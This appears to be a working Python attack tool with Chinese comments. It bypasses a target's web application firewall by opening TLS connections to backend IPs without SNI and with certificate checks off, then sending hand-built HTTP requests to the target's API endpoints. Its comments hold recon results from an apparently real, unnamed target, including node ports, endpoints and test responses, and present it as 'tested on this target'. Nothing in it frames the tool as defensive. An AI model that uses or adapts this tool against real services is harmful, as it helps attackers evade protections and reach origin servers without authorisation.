#!/usr/bin/env python3
# ===== 能力修正 + WAF 绕过技巧（本靶标实测）=====
# 现象：同一 API，用「空 SNI + 任意 Host」直连 HTTPS 端口 → 200 正常 JSON；
#       用「SNI=<target>」→ TLS 阶段立即 RST（WAF 按 SNI 丢包）。
#
# 实测证据（2026-10-10）：
#   SNI=none Host=<target>  POST /api/getCurrencyExchangeRateV2 {} -> 200  {"code":"10000","data":"6.82"}
#   SNI=none Host=203.0.113.19  POST 同接口                        -> 200  同上
#   SNI=<target>            POST 同接口                        -> TLS_FAIL [WinError 10054] 远端强制关闭（RST）
#   同时段 7892 代理已挂（http 502 / https 000），改用直连后 API 全部可通
#
# ⚠️ 与另一观察相反（必须写清）：镜像/备份节点上 recon 的观察是「必须带真实 SNI/Host 才返回内容」，
#    而旁路节点 8700/8899 上「空 SNI + 任意 Host」即为 200 ⇒ **不同节点策略不同**，不能一概而论。
#
# 用法：
#   python dapi.py <ip:port> <sni|none> <host_header> <method> <path> [json_body]
#   python dapi.py 203.0.113.20:8700 none <target> POST /api/getFriIntroLevelReward '{}'
#
# 关键实现点：SSLContext(PROTOCOL_TLS_CLIENT) + check_hostname=False + verify_mode=CERT_NONE
#             + set_alpn_protocols(["http/1.1"]) + wrap_socket(server_hostname=None)   # ← 不发 SNI
#             + 手写 HTTP/1.0 请求（Host/UA/Accept/Connection: close + 可选 Content-Length）
# 适用场景：目标 WAF 只按 SNI 丢包（或按 SNI 做 vhost 分流）时，清空 SNI 常能直连源站/后端。

import socket, ssl, sys

def call(ip, port, sni, host_header, method, path, body=None, timeout=12.0):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try: ctx.set_alpn_protocols(["http/1.1"])
    except Exception: pass
    raw = socket.create_connection((ip, port), timeout=timeout); raw.settimeout(timeout)
    s = ctx.wrap_socket(raw, server_hostname=(None if sni in ("none", "-", "") else sni))
    head = ("%s %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 Chrome/203.0.113.21 Safari/537.36\r\nAccept: application/json\r\n"
            "Connection: close\r\n" % (method, path, host_header))
    payload = b""
    if body is not None:
        b = body.encode(); head += "Content-Type: application/json\r\nContent-Length: %d\r\n" % len(b); payload = b
    s.sendall(head.encode() + b"\r\n" + payload)
    out = b""
    while len(out) < 20000:
        try: d = s.recv(8192)
        except socket.timeout: break
        if not d: break
        out += d
    s.close()
    txt = out.decode("latin-1", "replace")
    print(txt.split("\r\n")[0], "|", txt.split("\r\n\r\n", 1)[-1][:200])

if __name__ == "__main__":
    a = sys.argv[1:6]
    call(a[0].split(":")[0], int(a[0].split(":")[1]), a[1], a[2], a[3], a[4],
         sys.argv[6] if len(sys.argv) > 6 else None)
